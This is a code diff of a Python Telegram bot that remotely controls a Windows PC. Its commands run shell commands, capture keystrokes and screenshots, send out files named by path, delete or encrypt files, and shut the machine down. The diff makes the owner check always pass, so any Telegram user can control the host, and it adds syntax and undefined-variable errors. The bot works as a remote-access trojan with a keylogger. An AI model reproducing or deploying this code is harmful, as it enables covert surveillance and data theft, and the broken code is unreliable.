@@ -20,7 +20,7 @@ with open('Res\\token.txt', 'r') as f:
 
 bot = telebot.TeleBot(token)
 
-chat_id = 670366651
+chat_id = 0
 keys = []
 mouse = False
 mouse_start = 0
@@ -124,20 +124,6 @@ def decrypt(file, password):
         bot.send_message(chat_id=chat_id, text='File ' + str(os.path.splitext(file)[0]) + ' successfully saved!')
 
 
-# Проверка на подключение
-try:
-    bot.send_message(chat_id=chat_id, text='Подключено')
-    action_log('Program has Started', 'Программа была запущена')
-
-except:
-    try:
-        time.sleep(100)
-        bot.send_message(chat_id=chat_id, text='Подключено')
-        action_log('Program has Started', 'Программа была запущена')
-
-    except:
-        bot.stop_polling()
-
 MouseLock = Thread(target=mouse_lock)
 MouseLock1 = Thread(target=mouse_lock)
 
@@ -145,65 +131,64 @@ MouseLock1 = Thread(target=mouse_lock)
 # Создание, отправка, сохранение, и запись в базу screenshot'a
 @bot.message_handler(commands=['screenshot'])
 def start_message(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
         now = datetime.datetime.now()
         action_log('Screenshot', 'Снимок экрана', now)
         now = now.strftime("%d%m%Y-%H%M%S")
-        bot.send_message(chat_id, f'{now}.png')
+        bot.send_message(message.chat.id, f'{now}.png')
         screenshot(now)
         pic = open(f'Images\\{now}.png', 'rb')
         try:
-            bot.send_photo(chat_id=chat_id, photo=pic, timeout=1000)
+            bot.send_photo(message.chat.id=message.chat.id, photo=pic, timeout=1000)
         except:
-            bot.send_message(chat_id, 'time_out')
+            bot.send_message(message.chat.id, 'time_out')
 
 
 # Открытие консоли и ввод команды
 @bot.message_handler(commands=['cmd'])
 def start_message(message):
-    global cmd_stop, chat_id
-    if message.chat.id != chat_id:
+    global cmd_stop
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Введите команду:')
+        bot.send_message(message.chat.id, 'Введите команду:')
         cmd_stop = True
 
 
 @bot.message_handler(func=lambda message: cmd_stop, content_types=['text'])
 def command_default(message):
-    global cmd_stop, chat_id
+    global cmd_stop
     now = datetime.datetime.now()
     action_log('Input command', f'Команда :{message.text}', now)
     bot.send_message(chat_id=message.chat.id, text=f"Попытка запустить команду '{message.text}'")
     try:
         subprocess.check_call('cmd.exe /c start' + f' {message.text}')
-        bot.send_message(chat_id, text=f"Команда '{message.text}' запущена")
+        bot.send_message(message.chat.id, text=f"Команда '{message.text}' запущена")
     except:
-        bot.send_message(chat_id, text=f"Попытка запустить команду '{message.text}' провалена")
+        bot.send_message(message.chat.id, text=f"Попытка запустить команду '{message.text}' провалена")
     cmd_stop = False
 
 
 # Ввод куда либо текста
 @bot.message_handler(commands=['text'])
 def start_message(message):
-    global enter_text, chat_id
-    if message.chat.id != chat_id:
+    global enter_text
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Введите текст:')
+        bot.send_message(message.chat.id, 'Введите текст:')
         enter_text = True
 
 
 @bot.message_handler(func=lambda message: enter_text, content_types=['text'])
 def command_default(message):
-    global enter_text, chat_id
-    bot.send_message(chat_id=chat_id, text=f"Ввод текста '{message.text}'")
+    global enter_text
+    bot.send_message(chat_id=message.chat.id, text=f"Ввод текста '{message.text}'")
     now = datetime.datetime.now()
     action_log('Text_Input', f'Ввод текста: {message.text}', now)
     pyperclip.copy(message.text)
@@ -215,50 +200,47 @@ def command_default(message):
 # Key_logger
 @bot.message_handler(commands=['keys'])
 def start_message(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
         now = datetime.datetime.now()
         action_log('Key_Logger', f'Сохранение нажатий за 20 секунд', now)
-        bot.send_message(chat_id, 'Клавиши за 20 секунд:')
+        bot.send_message(message.chat.id, 'Клавиши за 20 секунд:')
         key_log = key_logger(now)
         if len(key_log) == 0:
             key_log = 'None'
-        bot.send_message(chat_id, key_log)
+        bot.send_message(message.chat.id, key_log)
 
 
 # Выключение Компьютера
 @bot.message_handler(commands=['shutdown'])
 def start_message(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
         action_log('Shutdown', 'Компьютер был отключен программой')
-        bot.send_message(chat_id, "Выключение компьютера")
+        bot.send_message(message.chat.id, "Выключение компьютера")
         os.system('shutdown -s -f -t 0')
 
 
 # Mouse_Lock
 @bot.message_handler(commands=['mouselock'])
 def start_message(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
         markup = telebot.types.InlineKeyboardMarkup()
         markup.add(telebot.types.InlineKeyboardButton(text='On', callback_data='1'))
         markup.add(telebot.types.InlineKeyboardButton(text='OFF', callback_data='2'))
-        bot.send_message(chat_id, text="Mouse Lock?", reply_markup=markup)
+        bot.send_message(message.chat.id, text="Mouse Lock?", reply_markup=markup)
 
 
 @bot.callback_query_handler(func=lambda call: True)
 def query_handler(call):
-    global mouse, mouse_start, chat_id
+    global mouse, mouse_start
     if call.data == '1' and mouse_start in [0, 1] and not mouse:
         mouse = True
         if mouse_start == 0:
@@ -278,162 +260,162 @@ def query_handler(call):
         answer = 'Mouse Lock has blocked'
     action_log('Mouse_Lock', answer)
     bot.answer_callback_query(callback_query_id=call.id, text=answer)
-    bot.send_message(chat_id, answer)
-    bot.edit_message_reply_markup(chat_id, call.message.message_id)
+    bot.send_message(message.chat.id, answer)
+    bot.edit_message_reply_markup(message.chat.id, call.message.message_id)
 
 
 # Загрузка сохранённых скринов, есть 'download', но так быстрее(только по названию)
 @bot.message_handler(commands=['image'])
 def start_message(message):
-    global upload_image, chat_id
-    if message.chat.id != chat_id:
+    global upload_image
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Введите название image:')
+        bot.send_message(message.chat.id, 'Введите название image:')
         upload_image = True
 
 
 @bot.message_handler(func=lambda message: upload_image, content_types=['text'])
 def command_default(message):
-    global upload_image, chat_id
-    bot.send_message(chat_id=chat_id, text=f"Uploading image: '{message.text}'")
+    global upload_image
+    bot.send_message(chat_id=message.chat.id, text=f"Uploading image: '{message.text}'")
     action_log('Uploading_an_image', f'Uploading image: {message.text}')
     try:
         image = open(f'Images\\{message.text}', 'rb')
-        bot.send_document(chat_id, image)
+        bot.send_document(message.chat.id, image)
     except FileNotFoundError:
-        bot.send_message(chat_id=chat_id, text=f"Image '{message.text}' not found")
+        bot.send_message(chat_id=message.chat.id, text=f"Image '{message.text}' not found")
     upload_image = False
 
 
 @bot.message_handler(commands=['encrypt'])
 def start_message(message):
-    global Encrypt, chat_id
-    if message.chat.id != chat_id:
+    global Encrypt
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Enter file and password\nform: File Password:')
+        bot.send_message(message.chat.id, 'Enter file and password\nform: File Password:')
         Encrypt = True
 
 
 @bot.message_handler(func=lambda message: Encrypt, content_types=['text'])
 def command_default(message):
-    global Encrypt, chat_id
-    bot.send_message(chat_id=chat_id, text=f"Encrypt file: '{message.text.split(' ')[0]}'")
+    global Encrypt
+    bot.send_message(chat_id=message.chat.id, text=f"Encrypt file: '{message.text.split(' ')[0]}'")
     try:
         file, password = message.text.split(' ')
         encrypt(file, password)
         now = datetime.datetime.now()
         action_log('Encrypt file', f'Encrypt file: {message.text}', now)
     except ValueError:
-        bot.send_message(chat_id=chat_id, text=f"Please input 2 elements\nbut not'{message.text}'")
+        bot.send_message(chat_id=message.chat.id, text=f"Please input 2 elements\nbut not'{message.text}'")
     Encrypt = False
 
 
 @bot.message_handler(commands=['decrypt'])
 def start_message(message):
-    global Decrypt, chat_id
-    if message.chat.id != chat_id:
+    global Decrypt
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Enter file and password\nform: File Password:')
+        bot.send_message(message.chat.id, 'Enter file and password\nform: File Password:')
         Decrypt = True
 
 
 @bot.message_handler(func=lambda message: Decrypt, content_types=['text'])
 def command_default(message):
-    global Decrypt, chat_id
-    bot.send_message(chat_id=chat_id, text=f"Decrypt file:\n'{message.text.split(' ')[0]}'")
+    global Decrypt
+    bot.send_message(chat_id=message.chat.id, text=f"Decrypt file:\n'{message.text.split(' ')[0]}'")
     try:
         file, password = message.text.split(' ')
         decrypt(file, password)
         now = datetime.datetime.now()
         action_log('Decrypt file', f'Decrypt file: {message.text}', now)
     except ValueError:
-        bot.send_message(chat_id=chat_id, text=f"Please input 2 elements\nbut not'{message.text}'")
+        bot.send_message(chat_id=message.chat.id, text=f"Please input 2 elements\nbut not'{message.text}'")
     Decrypt = False
 
 
 # Отправить файл с компьютера
 @bot.message_handler(commands=['download'])
 def start_message(message):
-    global upload_file, chat_id
-    if message.chat.id != chat_id:
+    global upload_file
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Введите полный путь к файлу:')
+        bot.send_message(message.chat.id, 'Введите полный путь к файлу:')
         upload_file = True
 
 
 @bot.message_handler(func=lambda message: upload_file, content_types=['text'])
 def command_default(message):
-    global upload_file, chat_id
-    bot.send_message(chat_id=chat_id, text=f"Uploading File:\n {message.text}")
+    global upload_file
+    bot.send_message(chat_id=message.chat.id, text=f"Uploading File:\n {message.text}")
     action_log('Upload_File', f'Uploading File: {message.text}')
     try:
         image = open(message.text, 'rb')
-        bot.send_document(chat_id, image)
+        bot.send_document(message.chat.id, image)
     except FileNotFoundError:
-        bot.send_message(chat_id=chat_id, text=f"File '{message.text}' not found")
+        bot.send_message(chat_id=message.chat.id, text=f"File '{message.text}' not found")
     upload_file = False
 
 
 @bot.message_handler(commands=['update'])
 def start_message(message):
-    global update, chat_id
-    if message.chat.id != chat_id:
+    global update
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Отправте файл обновления')
+        bot.send_message(message.chat.id, 'Отправте файл обновления')
         update = True
 
 
 @bot.message_handler(func=lambda message: update, content_types=['document'])
 def handle_file(message):
-    global chat_id, update
+    global update
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         with open('update.pyw', 'wb') as new_file:
             new_file.write(downloaded_file)
-        bot.send_message(chat_id, 'Начало обновления')
+        bot.send_message(message.chat.id, 'Начало обновления')
         action_log('Update', 'Update Bot')
         bot.stop_polling()
         os.startfile('Updater.pyw')
     except Exception as e:
-        bot.send_message(chat_id, str(e))
+        bot.send_message(message.chat.id, str(e))
     update = False
 
 
 @bot.message_handler(commands=['backup'])
 def start_message(message):
-    global backup, chat_id
-    if message.chat.id != chat_id:
+    global backup
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, "Подтвердите начало backup'a:   Y/N")
+        bot.send_message(message.chat.id, "Подтвердите начало backup'a:   Y/N")
         backup = True
 
 
 @bot.message_handler(func=lambda message: backup, content_types=['text'])
 def handle_file(message):
-    global chat_id, backup
+    global backup
     try:
         if message.text == 'Y':
-            bot.send_message(chat_id, 'Начало backup`a')
+            bot.send_message(message.chat.id, 'Начало backup`a')
             action_log('Backup', 'Backup Bot to last version')
             bot.stop_polling()
             os.startfile('Backup.pyw')
         else:
-            bot.send_message(chat_id, 'Backup отменён')
+            bot.send_message(message.chat.id, 'Backup отменён')
     except Exception as e:
-        bot.send_message(chat_id, str(e))
+        bot.send_message(message.chat.id, str(e))
     backup = False
 
 
@@ -441,59 +423,56 @@ def handle_file(message):
 
 @bot.message_handler(commands=['start'])
 def start_message(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
         try:
             pyautogui.hotkey("f5")
         except:
-            bot.send_message(chat_id, 'time_out')
+            bot.send_message(message.chat.id, 'time_out')
 
 
 # Следующий слайд
 @bot.message_handler(commands=['next'])
 def start_message(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
         try:
             pyautogui.hotkey("space")
         except:
-            bot.send_message(chat_id, 'time_out')
+            bot.send_message(message.chat.id, 'time_out')
 
 
 # Прошлый слайд
 @bot.message_handler(commands=['back'])
 def start_message(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
         try:
             pyautogui.hotkey("left")
         except:
-            bot.send_message(chat_id, 'time_out')
+            bot.send_message(message.chat.id, 'time_out')
 
 
 @bot.message_handler(commands=['delete'])
 def start_message(message):
-    global delete, chat_id
-    if message.chat.id != chat_id:
+    global delete
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Ввидите путь до файла или папки для удаления')
+        bot.send_message(message.chat.id, 'Ввидите путь до файла или папки для удаления')
         delete = True
 
 
 @bot.message_handler(func=lambda message: delete, content_types=['text'])
 def handle_file(message):
-    global chat_id, delete
+    global delete
     try:
         if '.' not in message.text:
             os.remove(message.text)
@@ -501,48 +480,48 @@ def handle_file(message):
             os.rmdir(message.text)
         action_log('Delete', 'Delete: ' + message.text)
     except Exception as e:
-        bot.send_message(chat_id, str(e))
+        bot.send_message(message.chat.id, str(e))
     delete = False
 
 
 @bot.message_handler(commands=['open'])
 def start_message(message):
-    global run, chat_id
-    if message.chat.id != chat_id:
+    global run
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Ввидите путь до файла или папки')
+        bot.send_message(message.chat.id, 'Ввидите путь до файла или папки')
         run = True
 
 
 @bot.message_handler(func=lambda message: run, content_types=['text'])
 def handle_file(message):
-    global chat_id, run
+    global run
     try:
         os.startfile(message.text)
         action_log('Open', 'Open: ' + message.text)
     except Exception as e:
-        bot.send_message(chat_id, str(e))
+        bot.send_message(message.chat.id, str(e))
     run = False
 
 
 # Просмотр файлов в определённой дириктории
 @bot.message_handler(commands=['dir'])
 def start_message(message):
-    global dirs, chat_id
-    if message.chat.id != chat_id:
+    global dirs
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Введите дирикторию:')
+        bot.send_message(message.chat.id, 'Введите дирикторию:')
         dirs = True
 
 
 @bot.message_handler(func=lambda message: dirs, content_types=['text'])
 def command_default(message):
-    global dirs, chat_id
-    bot.send_message(chat_id=chat_id, text=f"File in Dir:\n {message.text}")
+    global dirs
+    bot.send_message(chat_id=message.chat.id, text=f"File in Dir:\n {message.text}")
     action_log('Dir:', f'File and dirs in Directory: {message.text}')
     try:
         dirs_in_folder = os.listdir(message.text)
@@ -555,47 +534,45 @@ def command_default(message):
         with open('dirs.txt', 'w') as file:
             file.write(end)
         file = open('dirs.txt', 'rb')
-        bot.send_document(chat_id, file)
+        bot.send_document(message.chat.id, file)
     except FileNotFoundError:
-        bot.send_message(chat_id=chat_id, text=f"File '{message.text}' not found")
+        bot.send_message(chat_id=message.chat.id, text=f"File '{message.text}' not found")
     dirs = False
 
 
 # Выключение бота
 @bot.message_handler(commands=['exit'])
 def start_message(message):
-    global upload_image, chat_id
-    if message.chat.id != chat_id:
+    global upload_image
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id=chat_id, text=f"Bot has stopped")
+        bot.send_message(chat_id=message.chat.id, text=f"Bot has stopped")
         bot.stop_polling()
         action_log('Bot has stopped', f'Остановка работы Бота')
 
 
 @bot.message_handler(commands=['mute'])
 def start_message(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
         try:
             pyautogui.hotkey("=")
         except:
-            bot.send_message(chat_id, 'time_out')
+            bot.send_message(message.chat.id, 'time_out')
 
 
 # Проверка наличия подключения любым сообщением
 @bot.message_handler(content_types=['text'])
 def send_text(message):
-    global chat_id
-    if message.chat.id != chat_id:
+    if message.chat.id != message.chat.id:
         with open('third-party-users.txt', 'a') as file:
             file.write(message.chat.id)
     else:
-        bot.send_message(chat_id, 'Есть сигнал')
+        bot.send_message(message.chat.id, 'Есть сигнал')
 
 
 bot.polling()
